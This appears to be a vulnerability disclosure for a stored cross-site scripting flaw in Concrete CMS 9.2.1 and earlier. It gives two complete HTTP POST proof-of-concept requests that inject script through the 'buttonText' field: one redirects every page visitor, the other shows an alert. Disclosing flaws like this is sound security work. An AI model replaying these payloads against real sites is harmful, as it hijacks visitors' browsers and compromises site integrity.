BUG_Author:
LJWIIE

Affected version:
Concrete CMS versions 9.2.1 and earlier

Vendor:
https://www.concretecms.org/

Software:

https://www.concretecms.org/download

https://github.com/concretecms/concretecms/releases/tag/9.2.1

Vulnerability File:
index.php/ccm/system/dialogs/block/edit.php, function submit()

Description:

In Concrete CMS versions 9.2.1 and earlier, authenticated users can execute Stored Cross-Site Scripting (XSS) attacks via the "buttonText" parameter in the "Edit Feature Link" function. This may lead to harmful actions such as redirects, unwanted ads, and executing malicious HTML code, posing risks to visitors and the site's integrity.

Status: Medium

POST parameter 'buttonText' contains a Stored Cross-Site Scripting (XSS) vulnerability

[**Redirect to Google official website**]Payload1:

```html
POST /concretecms/index.php/ccm/system/dialogs/block/edit/submit?ccm_token=1695476922:c261176e790a549f600ab848e4ec5b71&cID=1&arHandle=Main+%3A+3+%3A+Column+2&bID=1661 HTTP/1.1
Host: 192.168.157.135
Content-Length: 1779
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarykwuKxwH267kqwS4O
Origin: http://192.168.157.135
Referer: http://192.168.157.135/concretecms/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: CONCRETE_LOGIN=1; CONCRETE=uom43h1edq4r6tcaiamp3duemr
Connection: close

------WebKitFormBoundarykwuKxwH267kqwS4O
Content-Disposition: form-data; name="title"

Leverage agile frameworks to provide a robust synopsis
------WebKitFormBoundarykwuKxwH267kqwS4O
Content-Disposition: form-data; name="titleFormat"

h2
------WebKitFormBoundarykwuKxwH267kqwS4O
Content-Disposition: form-data; name="body"

<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas varius tortor nibh, sit amet tempor nibh finibus et. Aenean eu enim justo.</p>

------WebKitFormBoundarykwuKxwH267kqwS4O
Content-Disposition: form-data; name="fID"

0
------WebKitFormBoundarykwuKxwH267kqwS4O
Content-Disposition: form-data; name="buttonText"

Learn More<script>window.onload =function(){window.location.href='https://www.google.com';};</script><a>
------WebKitFormBoundarykwuKxwH267kqwS4O
Content-Disposition: form-data; name="buttonSize"

lg
------WebKitFormBoundarykwuKxwH267kqwS4O
Content-Disposition: form-data; name="buttonStyle"

outline
------WebKitFormBoundarykwuKxwH267kqwS4O
Content-Disposition: form-data; name="buttonColor"

primary
------WebKitFormBoundarykwuKxwH267kqwS4O
Content-Disposition: form-data; name="icon"


------WebKitFormBoundarykwuKxwH267kqwS4O
Content-Disposition: form-data; name="imageLink__which"

none
------WebKitFormBoundarykwuKxwH267kqwS4O
Content-Disposition: form-data; name="imageLink_page"

0
------WebKitFormBoundarykwuKxwH267kqwS4O
Content-Disposition: form-data; name="imageLink_file"

0
------WebKitFormBoundarykwuKxwH267kqwS4O
Content-Disposition: form-data; name="imageLink_external_url"


------WebKitFormBoundarykwuKxwH267kqwS4O
Content-Disposition: form-data; name="ccm-edit-block-submit"

submit
------WebKitFormBoundarykwuKxwH267kqwS4O
Content-Disposition: form-data; name="__ccm_consider_request_as_xhr"

1
------WebKitFormBoundarykwuKxwH267kqwS4O--
```

![image](https://github.com/IIE-Safety/buttonText/assets/65028436/8c091e7b-bfb8-4494-9aed-3c9fe63c38ff)

![image](https://github.com/IIE-Safety/buttonText/assets/65028436/09c98f1b-387e-4020-8ff7-69d7109bead9)

Once edited and saved, anyone visiting this page will be forced to visit the Google website.
Below is a gif showing it.

![RedirectToGoogle](https://github.com/IIE-Safety/StoredXSS_BODY/assets/65028436/3d2ed4e1-abec-4053-8166-5bdf198de7bd)

[**Display alert window**]Payload2:

```html
POST /concretecms/index.php/ccm/system/dialogs/block/edit/submit?ccm_token=1695476595:90031b708bd3b66ddc08914b7fe02a7d&cID=1&arHandle=Main+%3A+3+%3A+Column+2&bID=1661 HTTP/1.1
Host: 192.168.157.135
Content-Length: 1779
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryRkj5J4MxwpyM9iQF
Origin: http://192.168.157.135
Referer: http://192.168.157.135/concretecms/index.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: CONCRETE_LOGIN=1; CONCRETE=uom43h1edq4r6tcaiamp3duemr
Connection: close

------WebKitFormBoundaryRkj5J4MxwpyM9iQF
Content-Disposition: form-data; name="title"

Leverage agile frameworks to provide a robust synopsis
------WebKitFormBoundaryRkj5J4MxwpyM9iQF
Content-Disposition: form-data; name="titleFormat"

h2
------WebKitFormBoundaryRkj5J4MxwpyM9iQF
Content-Disposition: form-data; name="body"

<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas varius tortor nibh, sit amet tempor nibh finibus et. Aenean eu enim justo.</p>

------WebKitFormBoundaryRkj5J4MxwpyM9iQF
Content-Disposition: form-data; name="fID"

0
------WebKitFormBoundaryRkj5J4MxwpyM9iQF
Content-Disposition: form-data; name="buttonText"

Learn More<script>alert("You have been hacked!")</script><a>
------WebKitFormBoundaryRkj5J4MxwpyM9iQF
Content-Disposition: form-data; name="buttonSize"

lg
------WebKitFormBoundaryRkj5J4MxwpyM9iQF
Content-Disposition: form-data; name="buttonStyle"

outline
------WebKitFormBoundaryRkj5J4MxwpyM9iQF
Content-Disposition: form-data; name="buttonColor"

primary
------WebKitFormBoundaryRkj5J4MxwpyM9iQF
Content-Disposition: form-data; name="icon"


------WebKitFormBoundaryRkj5J4MxwpyM9iQF
Content-Disposition: form-data; name="imageLink__which"

none
------WebKitFormBoundaryRkj5J4MxwpyM9iQF
Content-Disposition: form-data; name="imageLink_page"

0
------WebKitFormBoundaryRkj5J4MxwpyM9iQF
Content-Disposition: form-data; name="imageLink_file"

0
------WebKitFormBoundaryRkj5J4MxwpyM9iQF
Content-Disposition: form-data; name="imageLink_external_url"


------WebKitFormBoundaryRkj5J4MxwpyM9iQF
Content-Disposition: form-data; name="ccm-edit-block-submit"

submit
------WebKitFormBoundaryRkj5J4MxwpyM9iQF
Content-Disposition: form-data; name="__ccm_consider_request_as_xhr"

1
------WebKitFormBoundaryRkj5J4MxwpyM9iQF--
```

![image](https://github.com/IIE-Safety/buttonText/assets/65028436/b7054ddf-b1b3-4b6a-9495-cd511b42bd1b)

![image](https://github.com/IIE-Safety/buttonText/assets/65028436/09c98f1b-387e-4020-8ff7-69d7109bead9)

![image](https://github.com/IIE-Safety/StoredXSS_BODY/assets/65028436/aa0a61ad-c1c2-4903-8019-a1fa9a4f060c)

